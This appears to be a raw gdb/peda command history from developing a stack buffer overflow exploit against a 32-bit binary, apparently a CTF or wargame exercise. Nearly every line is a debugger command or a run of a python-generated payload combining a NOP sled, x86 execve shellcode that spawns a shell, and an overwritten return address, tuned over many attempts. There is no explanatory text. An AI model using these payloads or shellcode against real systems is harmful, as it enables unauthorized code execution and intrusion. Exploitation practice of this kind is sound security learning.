x/10 0xbffff300
x/100 0xbffff300
r <<< `python -c "print 'A'*(9431 - 51) + '\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2e\x2f\x62\x69\x68\x2f\x2e\x2f\x2e\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x10\xfe\xc8\xec\xfe\xc8\xec\xfe\xc8\xec\xfe\xc8\xec\xfe\xc8\xec\xcd\x80\x31\xc0\x40\xcd\x80' + '\x90'*16 + '\x40\xf3\xff\xbf'"`
x/100 0xbffff300
x/100wx 0xbffff300
r <<< `python -c "print '\x90'*(9431 - 51) + '\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2e\x2f\x62\x69\x68\x2f\x2e\x2f\x2e\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x10\xfe\xc8\xec\xfe\xc8\xec\xfe\xc8\xec\xfe\xc8\xec\xfe\xc8\xec\xcd\x80\x31\xc0\x40\xcd\x80' + '\x90'*16 + '\x41\xf3\xff\xbf'"`
c
ni
assemble
shellcode
shellcode generate x86
shellcode generate x86/linux exec
r <<< `python -c "print '\x90'*(9431 - 24) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80' + '\x90'*16 + '\x41\xf3\xff\xbf'"`
c
ni
r <<< `python -c "print '\x90'*(9431 - 24) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80' + '\x90'*16 + '\x41\xf3\xff\xbf'"`
c
x/100wx 0xbffff300
r <<< `python -c "print '\x90'*(9431 - 41) + '\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2e\x2f\x62\x69\x68\x2f\x2e\x2f\x2e\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x10\x48\xec\x48\xec\x48\xec\x48\xec\x48\xec\xcd\x80\x31\xc0\x40\xcd\x80' + '\x90'*16 + '\x41\xf3\xff\xbf'"`
c
ni
ni
r <<< `python -c "print '\x90'*(9431 - 46) + '\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2e\x2f\x62\x69\x68\x2f\x2e\x2f\x2e\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x10\x48\xec\x48\xec\x48\xec\x48\xec\x48\xec\xcd\x80\x31\xc0\x40\xcd\x80' + '\x90'*16 + '\x41\xf3\xff\xbf'"`
c
ni
c
checksec
r <<< `python -c "print '\x90'*(9431 - 46) + '\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2e\x2f\x62\x69\x68\x2f\x2e\x2f\x2e\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x10\x48\xec\x48\xec\x48\xec\x48\xec\x48\xec\xcd\x80\x31\xc0\x40\xcd\x80' + '\x90'*16 + '\x41\xf3\xff\xbf'"`
q
b *0x08048542
r
ni
x/100wx 0xbffff300
i f
r <<< `python -c "print '\x90'*(9431 - 46) + '\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2e\x2f\x62\x69\x68\x2f\x2e\x2f\x2e\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x10\x48\xec\x48\xec\x48\xec\x48\xec\x48\xec\xcd\x80\x31\xc0\x40\xcd\x80' + '\x90'*16 + '\x41\xf3\xff\xbf'"`
ni
c
peda
q
pdisas main
r <<< `python -c "print '\x90'*(9431 - 48) + '\x90\x90\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2e\x2f\x62\x69\x68\x2f\x2e\x2f\x2e\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x10\x48\xec\x48\xec\x48\xec\x48\xec\x48\xec\xcd\x80\x31\xc0\x40\xcd\x80' + '\x90'*16 + '\x41\xf3\xff\xbf'"`
r <<< `python -c "print '\x90'*(9431 - 48) + '\xeb\xfe\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2e\x2f\x62\x69\x68\x2f\x2e\x2f\x2e\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x10\x48\xec\x48\xec\x48\xec\x48\xec\x48\xec\xcd\x80\x31\xc0\x40\xcd\x80' + '\x90'*16 + '\x41\xf3\xff\xbf'"`
q
pdisas main
b *0xbffff341
r <<< `python -c "print '\x90'*(9431 - 48) + '\x90\x90\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2e\x2f\x62\x69\x68\x2f\x2e\x2f\x2e\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x10\x48\xec\x48\xec\x48\xec\x48\xec\x48\xec\xcd\x80\x31\xc0\x40\xcd\x80' + '\x90'*16 + '\x41\xf3\xff\xbf'"`
x/10wx 0xbffff36b
r <<< `python -c "print '\x90'*(9431 - 44) + '\x90\x90\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2e\x2f\x62\x69\x68\x2f\x2e\x2f\x2e\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x10\x48\x48\x48\x48\x48\xcd\x80\x31\xc0\x40\xcd\x80' + '\x90'*16 + '\x41\xf3\xff\xbf'"`
r <<< `python -c "print '\x90'*(9431 - 44) + '\x90\x90\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2e\x2f\x62\x69\x68\x2f\x2e\x2f\x2e\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x10\x48\x48\x48\x48\x48\xcd\x80\x31\xc0\x40\xcd\x80' + '\x90'*17 + '\x41\xf3\xff\xbf'"`
r <<< `python -c "print '\x90'*(9431 - 44) + '\x90\x90\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2e\x2f\x62\x69\x68\x2f\x2e\x2f\x2e\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x10\x48\x48\x48\x48\x48\xcd\x80\x31\xc0\x40\xcd\x80' + '\x90'*17 + '\x41\xf3\xff\xbf'"`
q
pdisas main
b *0x08048542
r 
i f
r <<< `python -c "print 'A'*9447"`
i f
x/100wx 0xbffff300
i f
x/100wx 0xb7e29a00
x/100wx 0xbffff300
i f
checksec
pdisas main
x/100wx 0x080484ed
pdisas main
x/100wx 0xbffff300
r <<< `python -c "print '\x90'*9447 + '\x40\xf3\xff\xbf'"`
x/100wx 0xbffff300
i f
ni
ni
r <<< `python -c "print '\x90'*(9447-41) + '\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2e\x2f\x62\x69\x68\x2f\x2e\x2f\x2e\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x10\x48\x48\x48\x48\x48\xcd\x80\x31\xc0\x40\xcd\x80' + '\x40\xf3\xff\xbf'"`
x/100wx 0xbffff300
ni
ni 5
ni 5
ni 5
ni 5
ni 5
r <<< `python -c "print '\x90'*(9447-41) + '\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2e\x2f\x62\x69\x68\x2f\x2e\x2f\x2e\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x10\x48\x48\x48\x48\x48\xcd\x80\x31\xc0\x40\xcd\x80' + '\x40\xf3\xff\xbf'"`
ni
ni 20
ni 5
ni 4
ni
si
ni
ni 5
c
q
r <<< `python -c "print '\x90'*(9447-41 -50) + '\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2e\x2f\x62\x69\x68\x2f\x2e\x2f\x2e\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x10\x48\x48\x48\x48\x48\xcd\x80\x31\xc0\x40\xcd\x80' + 'D'*50 + '\x40\xf3\xff\xbf'"`
q
b *0x08048542
q
b *0x08048542
r <<< `python -c "print '\x90'*(9447-41 -50) + '\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2e\x2f\x62\x69\x68\x2f\x2e\x2f\x2e\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x10\x48\x48\x48\x48\x48\xcd\x80\x31\xc0\x40\xcd\x80' + 'D'*50 + '\x40\xf3\xff\xbf'"`
ni
ni 4
ni
r <<< `python -c "print '\x90'*(9447-41 -50) + '\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2e\x2f\x62\x69\x68\x2f\x2e\x2f\x2e\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x10\x48\x48\x48\x48\x48\xcd\x80\x31\xc0\x40\xcd\x80' + 'D'*50 + '\x40\xf3\xff\xbf'"`
q
pdisas main
b *0x0804855c
r <<< `python -c "print 'A'*10000"`
i f
info frame
checksec
x/100wx 0xbffff300
pdisas main
if 
i f
p 0x24f0
r <<< `python -c "print 'A'*9447 + 'B'*20"`
i f
x/100wx 0xbffff300
r <<< `python -c "print '\x90'*9447 + '\x10\xf3\xff\xbf'"`
i f
ni
ni
q
r <<< `python -c "print '\x90'*(9447-141) + '\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2e\x2f\x62\x69\x68\x2f\x2e\x2f\x2e\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x10\x48\x48\x48\x48\x48\xcd\x80\x31\xc0\x40\xcd\x80'+ '\x90'*100 + '\xf0\xf2\xff\xbf'"`
q
r <<< `python -c "print 'A'*10000"`
pdisas main
b *0x0804855c
r <<< `python -c "print 'A'*10000"`
i f
x/100wx 0xffffd300
r <<< `python -c "print 'A'*9447 + 'Q'*100"`
x/100wx 0xffffd300
r <<< `python -c "print 'A'*9447 + 'ABCD'*100"`
x/100wx 0xffffd300
r <<< `python -c "print '\x90'*9447 + 'ABCD'"`
x/100wx 0xffffd300
r <<< `python -c "print '\x90'*9447 + '\xff\xff\xd3\x40'"`
x/100wx 0xffffd300
r <<< `python -c "print '\x90'*9447 + '\x40\xd3\xff\xff'"`
x/100wx 0xffffd300
i f
ni
s
n
si
x/100wx 0xbffff300
x/100wx 0xbffff300
x/100wx 0xffffd300
r <<< `python -c "print '\x90'*(9447-141) + '\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2e\x2f\x62\x69\x68\x2f\x2e\x2f\x2e\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x10\x48\x48\x48\x48\x48\xcd\x80\x31\xc0\x40\xcd\x80'+ '\x90'*100 + '\xf0\xf2\xff\xbf'"`
ni
ni
r <<< `python -c "print '\x90'*(9447-141) + '\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2e\x2f\x62\x69\x68\x2f\x2e\x2f\x2e\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x10\x48\x48\x48\x48\x48\xcd\x80\x31\xc0\x40\xcd\x80'+ '\x90'*100 + '\xf0\xf2\xff\xff'"`
ni
q
pdisas main
ls
cat source.c
b *0x0804853d
run <<< `python -c "print 'A'*9447 + '\xaa\xbb\xcc\xdd'"`
info frame 
vmmap
x/100wx 0xffffd300
ni
x/100wx 0xffffd300
info frame
ni
ni
stepunitl ret
peda
stepuntil ret
c
r <<< `python -c "print '\x90'*(9447-141) + '\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2e\x2f\x62\x69\x68\x2f\x2e\x2f\x2e\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x10\x48\x48\x48\x48\x48\xcd\x80\x31\xc0\x40\xcd\x80'+ '\x90'*100 + '\xf0\xf2\xff\xff'"`
x/100wx 0xffffd300
ni
x/100wx 0xffffd300
stepuntil ret
info frame
pdias 0xfffff2f0
pdisas 0xfffff2f0
pdisas 0xfffff300
pdisas 0xfffff300/100
pdisas 0xfffff300/200
pdisas 0xfffff300/300
pdisas 0xfffff300/1000
pdisas 0xfffff340/100
pdisas 0xfffff340
pdisas 0xfffff340
x/100wx 0xfffff340
si
x/100wx 0xfffff340
ni
r <<< `python -c "print '\x90'*(9447-141) + '\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2e\x2f\x62\x69\x68\x2f\x2e\x2f\x2e\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x10\x48\x48\x48\x48\x48\xcd\x80\x31\xc0\x40\xcd\x80'+ '\x90'*100 + '\x40\xf3\xff\xff'"`
ni
x/100wx 0xfffff340
ni
r <<< `python -c "print '\x90'*(9447-141) + '\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2e\x2f\x62\x69\x68\x2f\x2e\x2f\x2e\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x10\x48\x48\x48\x48\x48\xcd\x80\x31\xc0\x40\xcd\x80'+ '\x90'*100 + '\x40\xf3\xff\xff'"`
ni
x/100wx 0xfffff340
x/100wx 0xffff340
x/100wx 0xfffff340
info frame
x/100wx 0xffffd3c8
x/100wx 0xffffd340
pdisas 0xffffd300/100
pdisas 0xffffd300/1000
pdisas 0xffffd340
pdisas 0xffffd330
pdisas 0xffffd330/100
pdisas 0xffffd330/200
pdisas 0xffffd330/200wx
pdisas 0xffffd330/200w
pdisas 0xffffd330 / 100
pdisas 0xffffd330 /100
pdisas 0xffffd330 /10
pdisas 0xffffd330 /100
r <<< `python -c "print '\x90'*(9447-141) + '\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2e\x2f\x62\x69\x68\x2f\x2e\x2f\x2e\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x10\x48\x48\x48\x48\x48\xcd\x80\x31\xc0\x40\xcd\x80'+ '\x90'*100 + '\x40\xf3\xfd\xff'"`
ni
r <<< `python -c "print '\x90'*(9447-141) + '\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2e\x2f\x62\x69\x68\x2f\x2e\x2f\x2e\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x10\x48\x48\x48\x48\x48\xcd\x80\x31\xc0\x40\xcd\x80'+ '\x90'*100 + '\x10\xf3\xfd\xff'"`
ni
pdisas 0xffffd330 /100
r <<< `python -c "print '\x90'*(9447-141) + '\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2e\x2f\x62\x69\x68\x2f\x2e\x2f\x2e\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x10\x48\x48\x48\x48\x48\xcd\x80\x31\xc0\x40\xcd\x80'+ '\x90'*100 + '\x10\xd3\xff\xff'"`
ni
ni
pdisas 0xffffd31f
pdisas 0xffffd300
pdisas 0xffffd310
ni
pdisas 0xffffd310
ni
pdisas 0xffffd310
ni
pdisas 0xffffd310
ni
pdisas 0xffffd310
ni
pdisas 0xffffd310
ni
pdisas 0xffffd310
ni
pdisas 0xffffd310
ni 5
ni 5
ni 5
pdisas 0xffffd310
pdisas 0xffffd320
pdisas 0xffffd335
ni 8
pdisas 0xffffd335
ni
ni
ni
r <<< `python -c "print '\x90'*(9447-141) + '\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2e\x2f\x62\x69\x68\x2f\x2e\x2f\x2e\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x10\x48\x48\x48\x48\x48\xcd\x80\x31\xc0\x40\xcd\x80'+ '\x90'*100 + '\x40\xf3\xfd\xff'"`
exit
q
b *0x0804853d
run
q
